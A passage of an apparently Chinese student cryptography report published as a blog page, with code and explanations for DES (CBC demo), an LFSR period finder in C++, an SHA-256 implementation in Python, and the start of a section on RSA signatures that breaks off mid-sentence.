class="comment"># dict[data[i:i+8]] = d</span></span><br><span class="line">            i += <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print "Lines: %d, cached: %d" % (lines, cached)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Return the full crypted string</span></span><br><span class="line">        <span class="keyword">if</span> _pythonMajorVersion &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>.join(result)<span class="comment">#</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> bytes.fromhex(<span class="string">''</span>).join(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data, pad=None, padmode=None)</span>:</span></span><br><span class="line">        <span class="string">"""encrypt(data, [pad], [padmode]) -&gt; bytes</span></span><br><span class="line"><span class="string">        data : Bytes to be encrypted</span></span><br><span class="line"><span class="string">        pad  : Optional argument for encryption padding. Must only be one byte</span></span><br><span class="line"><span class="string">        padmode : Optional argument for overriding the padding mode.</span></span><br><span class="line"><span class="string">        The data must be a multiple of 8 bytes and will be encrypted</span></span><br><span class="line"><span class="string">        with the already specified key. Data does not have to be a</span></span><br><span class="line"><span class="string">        multiple of 8 bytes if the padding character is supplied, or</span></span><br><span class="line"><span class="string">        the padmode is set to PAD_PKCS5, as bytes will then added to</span></span><br><span class="line"><span class="string">        ensure the be padded data is a multiple of 8 bytes.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        data = self._guardAgainstUnicode(data)</span><br><span class="line">        <span class="keyword">if</span> pad <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pad = self._guardAgainstUnicode(pad)</span><br><span class="line">        data = self._padData(data, pad, padmode)</span><br><span class="line">        <span class="keyword">return</span> self.crypt(data, des.ENCRYPT)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data, pad=None, padmode=None)</span>:</span></span><br><span class="line">        <span class="string">"""decrypt(data, [pad], [padmode]) -&gt; bytes</span></span><br><span class="line"><span class="string">        data : Bytes to be decrypted</span></span><br><span class="line"><span class="string">        pad  : Optional argument for decryption padding. Must only be one byte</span></span><br><span class="line"><span class="string">        padmode : Optional argument for overriding the padding mode.</span></span><br><span class="line"><span class="string">        The data must be a multiple of 8 bytes and will be decrypted</span></span><br><span class="line"><span class="string">        with the already specified key. In PAD_NORMAL mode, if the</span></span><br><span class="line"><span class="string">        optional padding character is supplied, then the un-encrypted</span></span><br><span class="line"><span class="string">        data will have the padding characters removed from the end of</span></span><br><span class="line"><span class="string">        the bytes. This pad removal only occurs on the last 8 bytes of</span></span><br><span class="line"><span class="string">        the data (last data block). In PAD_PKCS5 mode, the special</span></span><br><span class="line"><span class="string">        padding end markers will be removed from the data after decrypting.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        data = self._guardAgainstUnicode(data)</span><br><span class="line">        <span class="keyword">if</span> pad <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pad = self._guardAgainstUnicode(pad)</span><br><span class="line">        data = self.crypt(data, des.DECRYPT)</span><br><span class="line">        <span class="keyword">return</span> self._unpadData(data, pad, padmode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#from pyDes import *</span></span><br><span class="line"><span class="comment"># For python2，</span></span><br><span class="line"><span class="comment">#   data = "Please encrypt my data"</span></span><br><span class="line"><span class="comment">#   k = des("DESCRYPT", CBC, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)</span></span><br><span class="line"><span class="comment"># For Python3, you'll need to use bytes, i.e.:</span></span><br><span class="line"><span class="string">"""data = b"Please encrypt my data"</span></span><br><span class="line"><span class="string">k = des(b"DESCRYPT", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)</span></span><br><span class="line"><span class="string">d = k.encrypt(data)</span></span><br><span class="line"><span class="string">print("Encrypted: %r" % d)</span></span><br><span class="line"><span class="string">print("Decrypted: %r" % k.decrypt(d))</span></span><br><span class="line"><span class="string">assert k.decrypt(d, padmode=PAD_PKCS5) == data"""</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span>  time</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Example of DES encryption using CBC mode\n"</span>)</span><br><span class="line">t = time()</span><br><span class="line">k = des(<span class="string">"KANBEKTR"</span>,CBC, <span class="string">"\0\0\0\0\0\0\0\0"</span>,pad=<span class="literal">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">data = <span class="string">"CUMT-BXS"</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Key    : %r"</span> % k.getKey())</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Data   : %r"</span> % data)</span><br><span class="line">d = k.encrypt(data)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Encrypt: %r"</span> % d)</span><br><span class="line">d = k.decrypt(d)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Decrypt: %r"</span> % d)</span><br><span class="line"><span class="comment">#print ("DES time taken: %f (6 crypt operations)" % (time() - t))</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">""</span>)</span><br></pre></td></tr></table></figure>

<h3 id="程序运行截图-2"><a href="#程序运行截图-2" class="headerlink" title="程序运行截图"></a><span style='font-size:14.0pt'>程序运行截图</span></h3><p><span lang=EN-US><img src="/2020/02/20/pws/image011.jpg" class=""></span></p>
<h1 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>序列密码</span></a></h1><h2 id="线性移位寄存器（LFSR）"><a href="#线性移位寄存器（LFSR）" class="headerlink" title="线性移位寄存器（LFSR）"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>线性移位寄存器（LFSR）</span></a></h2><p><span >线性反馈移位寄存器（<span lang=EN-US>linear feedback shift register</span>，<span lang=EN-US> LFSR</span>）是指，给定前一状态的输出，将该输出的线性函数再用作输入的移位寄存器。异或运算是最常见的单比特线性函数：对寄存器的某些位进行异或操作后作为输入，再对寄存器中的各比特进行整体移位。</span><br><span >线性反馈移位寄存器（<span lang=EN-US>LFSR</span>）是一个产生二进制位序列的机制。这个寄存器由一个初始化矢量设置的一系列信元组成，最常见的是，密钥。这个寄存器的行为被一个时钟调节。在每个定时时刻，这个寄存器信元的内容被移动到一个正确的位置，这个排外的或这个信元子集内的内容被放在最左边的信元中。输出的一个位通常来自整个更新程序。<span  lang=EN-US>LFSRs</span>的应用包括产生伪随机数字，伪噪声序列，快速数字计算器和灰数序列。<span lang=EN-US>LFSR</span>软件和硬件的执行是相同的。</span></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a><span style='font-size:14.0pt'>实现</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> rg[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> jrg[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> sc[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> fs[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">1000000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(rg,<span class="string">'\0'</span>,<span class="keyword">sizeof</span>(rg));<span class="comment">//100000000000001 </span></span><br><span class="line">	<span class="built_in">memset</span>(fs,<span class="string">'\0'</span>,<span class="keyword">sizeof</span>(fs));<span class="comment">//100000000000001 </span></span><br><span class="line">	<span class="comment">//memset(jrg,'\0',sizeof(jrg));</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;rg);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;fs);</span><br><span class="line">	<span class="keyword">int</span> l=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(fs);i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(fs[i] == <span class="string">'1'</span>)&#123;</span><br><span class="line">			sc[l]=<span class="built_in">strlen</span>(fs)-i;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;sc[l]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			l++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;l&lt;&lt;<span class="string">" "</span>&lt;&lt;<span class="built_in">strlen</span>(fs)&lt;&lt;<span class="string">" "</span>&lt;&lt;<span class="built_in">strlen</span>(rg)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> t,c,time;</span><br><span class="line">	<span class="comment">//scanf("%d",&amp;t);</span></span><br><span class="line">	<span class="built_in">strcpy</span>(jrg,rg);</span><br><span class="line">	<span class="comment">//printf("%s\n",jrg);</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;;i++)&#123;</span><br><span class="line">		c=rg[sc[l<span class="number">-1</span>]<span class="number">-1</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=l<span class="number">-2</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">			<span class="comment">//res[i]=fs[j-1]^fs[j];</span></span><br><span class="line">			c=<span class="keyword">char</span>(((<span class="keyword">int</span>(c))+<span class="keyword">int</span>(rg[sc[j]<span class="number">-1</span>]))%<span class="number">2</span>+<span class="string">'0'</span>);</span><br><span class="line">		&#125;	<span class="comment">//xor</span></span><br><span class="line">		res[i]=rg[<span class="built_in">strlen</span>(rg)<span class="number">-1</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="built_in">strlen</span>(rg)<span class="number">-1</span>;k&gt;<span class="number">0</span>;k--)&#123;</span><br><span class="line">			rg[k]=rg[k<span class="number">-1</span>];</span><br><span class="line">		&#125;	<span class="comment">//&gt;&gt;1</span></span><br><span class="line">		rg[<span class="number">0</span>]=c;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,rg);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(rg,jrg))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		time=i+<span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"周期为:%d\n"</span>,time);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,res);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="程序运行截图-3"><a href="#程序运行截图-3" class="headerlink" title="程序运行截图"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>程序运行截图</span></a></h2><p><span lang=EN-US><img src="/2020/02/20/pws/image012.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/20/pws/image013.jpg" class=""></span></p>
<p><span lang=EN-US style='font-size:14.0pt'>&nbsp;</span></p>
<h1 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a><a name="_Toc28387027"><span style='font-size:16.0pt;font-family:黑体'>哈希函数</span></a></h1><h2 id="SHA-256分析"><a href="#SHA-256分析" class="headerlink" title="SHA-256分析"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>SHA-256分析</span></a></h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>初始化</span></a></h3><p><span lang=EN-US><img src="/2020/02/20/pws/image014.jpg" class=""></span></p>
<h3 id="准备消息列表"><a href="#准备消息列表" class="headerlink" title="准备消息列表"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>准备消息列表</span></a></h3><p><span lang=EN-US><img src="/2020/02/20/pws/image015.jpg" class=""></span></p>
<h3 id="轮散列值初始化"><a href="#轮散列值初始化" class="headerlink" title="轮散列值初始化"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>轮散列值初始化</span></a></h3><p>用每一轮的散列值的中间结果初始化8个工作变量A、B、C、D、E、F、G、H。初始定义由H0(0)-H7(7)给出。</p>
<h3 id="压缩函数"><a href="#压缩函数" class="headerlink" title="压缩函数"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>压缩函数</span></a></h3><p>对于0≤t≤63,执行（即压缩函数）：<br>T1=H+∑1{256}(e)+Ch(e,f,g)+Kt{256}+Wt<br>T2=∑0{256}(a)+Maj(a,b,c)<br>H=g g=h e=d+T1 d=c<br>c=b b=a a=T1+T2</p>
<h3 id="每组的中间散列值计算方法"><a href="#每组的中间散列值计算方法" class="headerlink" title="每组的中间散列值计算方法"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>每组的中间散列值计算方法</span></a></h3><p><span lang=EN-US>H<sub>0</sub><sup>(i)</sup>=a+H<sub>0</sub><sup>(i-j)</sup>,<br>H<sub>1</sub><sup>(i)</sup>=b+H<sub>1</sub><sup>(i-j)</sup>, H<sub>2</sub><sup>(i)</sup>=c+H<sub>2</sub><sup>(i-j)</sup>,<br>H<sub>3</sub><sup>(i)</sup>=d+H<sub>3</sub><sup>(i-j)</sup>, H<sub>4</sub><sup>(i)</sup>=e+H<sub>4</sub><sup>(i-j)</sup>,<br>H<sub>5</sub><sup>(i)</sup>=f+H<sub>5</sub><sup>(i-j)</sup>, H<sub>6</sub><sup>(i)</sup>=g+H<sub>6</sub><sup>(i-j)</sup>,<br>H<sub>7</sub><sup>(i)</sup>=h+H<sub>7</sub><sup>(i-j)</sup></span></p>
<p>这里<span lang=EN-US>i</span>是指消息的第<span lang=EN-US>i</span>个分组，将所有的分组处理完毕后，最后输出<span lang=EN-US>256</span>比特的<span lang=EN-US>Hash</span>值：<br><span lang=EN-US>H<sub>0</sub><sup>(N)</sup> | | H<sub>1</sub><sup>(N)</sup><br>| | H<sub>2</sub><sup>(N)</sup> | | H<sub>3</sub><sup>(N)</sup> | | H<sub>4</sub><sup>(N)</sup><br>| | H<sub>5</sub><sup>(N)</sup> H<sub>6</sub><sup>(N)</sup> | | H<sub>7</sub><sup>(N)<br></sup></span></p>
<p>算法中使用的<span lang=EN-US>6</span>个逻辑函数：</p>
<p><span lang=EN-US><img src="/2020/02/20/pws/image016.jpg" class=""></span></p>
<h2 id="SHA-256安全分析"><a href="#SHA-256安全分析" class="headerlink" title="SHA-256安全分析"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>SHA-256安全分析</span></a></h2><p><span lang=EN-US>Hash</span>函数的安全性很大程度上取决于抗强碰撞的能力，即攻击者找出两个涓息<span
lang=EN-US>M</span>和<span lang=EN-US>M<sup>t</sup>M≠M<sup>t</sup></span>，使得<span
lang=EN-US>H(M)=HM<sup>t </sup>&nbsp;,</span>因此，评价一个<span lang=EN-US>Hash</span>函数的安全性，就是看攻击者在现有的条件下，是否可以找到该函数的一对碰撞。目前已有的对<span
lang=EN-US>Hash</span>函数攻击的方法包括生日攻击、彩虹表攻击、差分攻击等。</p>
<h2 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>实现</span></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHA256</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.W = <span class="number">32</span></span><br><span class="line">        self.M = <span class="number">1</span> &lt;&lt; self.W</span><br><span class="line">        self.FF = self.M - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        self.constants = (</span><br><span class="line">            <span class="number">0x428a2f98</span>, <span class="number">0x71374491</span>, <span class="number">0xb5c0fbcf</span>, <span class="number">0xe9b5dba5</span>,</span><br><span class="line">            <span class="number">0x3956c25b</span>, <span class="number">0x59f111f1</span>, <span class="number">0x923f82a4</span>, <span class="number">0xab1c5ed5</span>,</span><br><span class="line">            <span class="number">0xd807aa98</span>, <span class="number">0x12835b01</span>, <span class="number">0x243185be</span>, <span class="number">0x550c7dc3</span>,</span><br><span class="line">            <span class="number">0x72be5d74</span>, <span class="number">0x80deb1fe</span>, <span class="number">0x9bdc06a7</span>, <span class="number">0xc19bf174</span>,</span><br><span class="line">            <span class="number">0xe49b69c1</span>, <span class="number">0xefbe4786</span>, <span class="number">0x0fc19dc6</span>, <span class="number">0x240ca1cc</span>,</span><br><span class="line">            <span class="number">0x2de92c6f</span>, <span class="number">0x4a7484aa</span>, <span class="number">0x5cb0a9dc</span>, <span class="number">0x76f988da</span>,</span><br><span class="line">            <span class="number">0x983e5152</span>, <span class="number">0xa831c66d</span>, <span class="number">0xb00327c8</span>, <span class="number">0xbf597fc7</span>,</span><br><span class="line">            <span class="number">0xc6e00bf3</span>, <span class="number">0xd5a79147</span>, <span class="number">0x06ca6351</span>, <span class="number">0x14292967</span>,</span><br><span class="line">            <span class="number">0x27b70a85</span>, <span class="number">0x2e1b2138</span>, <span class="number">0x4d2c6dfc</span>, <span class="number">0x53380d13</span>,</span><br><span class="line">            <span class="number">0x650a7354</span>, <span class="number">0x766a0abb</span>, <span class="number">0x81c2c92e</span>, <span class="number">0x92722c85</span>,</span><br><span class="line">            <span class="number">0xa2bfe8a1</span>, <span class="number">0xa81a664b</span>, <span class="number">0xc24b8b70</span>, <span class="number">0xc76c51a3</span>,</span><br><span class="line">            <span class="number">0xd192e819</span>, <span class="number">0xd6990624</span>, <span class="number">0xf40e3585</span>, <span class="number">0x106aa070</span>,</span><br><span class="line">            <span class="number">0x19a4c116</span>, <span class="number">0x1e376c08</span>, <span class="number">0x2748774c</span>, <span class="number">0x34b0bcb5</span>,</span><br><span class="line">            <span class="number">0x391c0cb3</span>, <span class="number">0x4ed8aa4a</span>, <span class="number">0x5b9cca4f</span>, <span class="number">0x682e6ff3</span>,</span><br><span class="line">            <span class="number">0x748f82ee</span>, <span class="number">0x78a5636f</span>, <span class="number">0x84c87814</span>, <span class="number">0x8cc70208</span>,</span><br><span class="line">            <span class="number">0x90befffa</span>, <span class="number">0xa4506ceb</span>, <span class="number">0xbef9a3f7</span>, <span class="number">0xc67178f2</span>)</span><br><span class="line"></span><br><span class="line">        self.compression_vals = (</span><br><span class="line">            <span class="number">0x6a09e667</span>, <span class="number">0xbb67ae85</span>, <span class="number">0x3c6ef372</span>, <span class="number">0xa54ff53a</span>,</span><br><span class="line">            <span class="number">0x510e527f</span>, <span class="number">0x9b05688c</span>, <span class="number">0x1f83d9ab</span>, <span class="number">0x5be0cd19</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ShiftRight</span><span class="params">(self, x, b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ((x &gt;&gt; b) | (x &lt;&lt; (self.W - b))) &amp; self.FF</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Pad</span><span class="params">(self, W)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> bytes(W, <span class="string">"ascii"</span>) + <span class="string">b"\x80"</span> + (<span class="string">b"\x00"</span> * ((<span class="number">55</span> <span class="keyword">if</span> (len(W) % <span class="number">64</span>) &lt; <span class="number">56</span> <span class="keyword">else</span> <span class="number">119</span>) - (len(W) % <span class="number">64</span>))) + (</span><br><span class="line">            (len(W) &lt;&lt; <span class="number">3</span>).to_bytes(<span class="number">8</span>, <span class="string">"big"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Compress</span><span class="params">(self, Wt, Kt, A, B, C, D, E, F, G, H)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ((H + (self.ShiftRight(E, <span class="number">6</span>) ^ self.ShiftRight(E, <span class="number">11</span>) ^ self.ShiftRight(E, <span class="number">25</span>)) + (</span><br><span class="line">                    (E &amp; F) ^ (~E &amp; G)) + Wt + Kt) + (</span><br><span class="line">                            self.ShiftRight(A, <span class="number">2</span>) ^ self.ShiftRight(A, <span class="number">13</span>) ^ self.ShiftRight(A, <span class="number">22</span>)) + (</span><br><span class="line">                            (A &amp; B) ^ (A &amp; C) ^ (B &amp; C))) &amp; self.FF, A, B, C, (D + (</span><br><span class="line">                    H + (self.ShiftRight(E, <span class="number">6</span>) ^ self.ShiftRight(E, <span class="number">11</span>) ^ self.ShiftRight(E, <span class="number">25</span>)) + (</span><br><span class="line">                        (E &amp; F) ^ (~E &amp; G)) + Wt + Kt)) &amp; self.FF, E, F, G</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(self, message)</span>:</span></span><br><span class="line">        message = self.Pad(message)</span><br><span class="line">        digest = list(self.compression_vals)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(message), <span class="number">64</span>):</span><br><span class="line">            S = message[i: i + <span class="number">64</span>]</span><br><span class="line">            W = [int.from_bytes(S[e: e + <span class="number">4</span>], <span class="string">"big"</span>) <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">64</span>, <span class="number">4</span>)] + ([<span class="number">0</span>] * <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>, <span class="number">64</span>):</span><br><span class="line">                W[j] = (W[j - <span class="number">16</span>] + (</span><br><span class="line">                            self.ShiftRight(W[j - <span class="number">15</span>], <span class="number">7</span>) ^ self.ShiftRight(W[j - <span class="number">15</span>], <span class="number">18</span>) ^ (W[j - <span class="number">15</span>] &gt;&gt; <span class="number">3</span>)) + W[</span><br><span class="line">                            j - <span class="number">7</span>] + (self.ShiftRight(W[j - <span class="number">2</span>], <span class="number">17</span>) ^ self.ShiftRight(W[j - <span class="number">2</span>], <span class="number">19</span>) ^ (</span><br><span class="line">                            W[j - <span class="number">2</span>] &gt;&gt; <span class="number">10</span>))) &amp; self.FF</span><br><span class="line"></span><br><span class="line">            A, B, C, D, E, F, G, H = digest</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">                A, B, C, D, E, F, G, H = self.Compress(W[j], self.constants[j], A, B, C, D, E, F, G, H)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(format(h, <span class="string">"02x"</span>) <span class="keyword">for</span> h <span class="keyword">in</span> <span class="string">b""</span>.join(</span><br><span class="line">            d.to_bytes(<span class="number">4</span>, <span class="string">"big"</span>) <span class="keyword">for</span> d <span class="keyword">in</span> [(x + y) &amp; self.FF <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(digest, (A, B, C, D, E, F, G, H))]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    encoder = SHA256()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        message = input(<span class="string">"Enter string: "</span>)</span><br><span class="line">        print(<span class="string">f"Output: <span class="subst">&#123;encoder.hash(message)&#125;</span>\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="程序运行截图-4"><a href="#程序运行截图-4" class="headerlink" title="程序运行截图"></a><a name="_Toc28387027"><span style='font-size:16.0pt;font-family:黑体'>程序运行截图</span></a></h2><p><span lang=EN-US><img src="/2020/02/20/pws/image017.jpg" class=""></span></p>
<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>RSA</span></a></h1><h2 id="基于RSA的数字签名"><a href="#基于RSA的数字签名" class="headerlink" title="基于RSA的数字签名"></a><a name="_Toc28387027"><span style='font-size:16.0pt;font-family:黑体'>基于RSA的数字签名</span></a></h2><h3 id="用RSA进行数字签名"><a href="#用RSA进行数字签名" class="headerlink" title="用RSA进行数字签名"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>用RSA进行数字签名</span></a></h3><p><span >在<span lang=EN-US>RSA</span>中，被签名的消息，密钥以及最终生成的签名都是以数字形式表示的，需要实现对文本编码成数字。用<span
lang=EN-US>RSA</span>生成签名的过程可以用下面的公式来表达。</span></p>
<p><span lang=EN-US style='font-size:10.5pt;font-family:等线'><img src="/2020/02/20/pws/image019.jpg" class=""></span></p>
<p><span lang=EN-US >&nbsp;</span></p>
<p><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br></span><span >这里使用的<span lang=EN-US>D</span>和<span
lang=EN-US>N</span>就是签名者的私钥。签名就是对消息的<span lang=EN-US>D</span>次方求<span
lang=EN-US>mod N</span>的结果，也就是说将消息和自己相乘<span lang=EN-US>D</span>次，然后再求<span
lang=EN-US>N</span>的模数，最后求得的数就是签名。</span></p>
<h3 id="用RSA验证签名"><a href="#用RSA验证签名" class="headerlink" title="用RSA验证签名"></a><a name="_Toc28387027"><span style='font-size:14.0pt;font-family:黑体'>用RSA验证签名</span></a></h3><p><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br></span><span lang=EN-US >RSA</span><span>的签名验证过程可用下列公式来表达：</span></p>
<p><span lang=EN-US><img src="/2020/02/20/pws/image020.jpg" class=""></span></p>
<p><span >这里所使用的<span lang=EN-US>E</span>和<span
lang=EN-US>N</span>就是签名者的公钥。接收者计算签名的<span lang=EN-US>E</span>次方并求<span
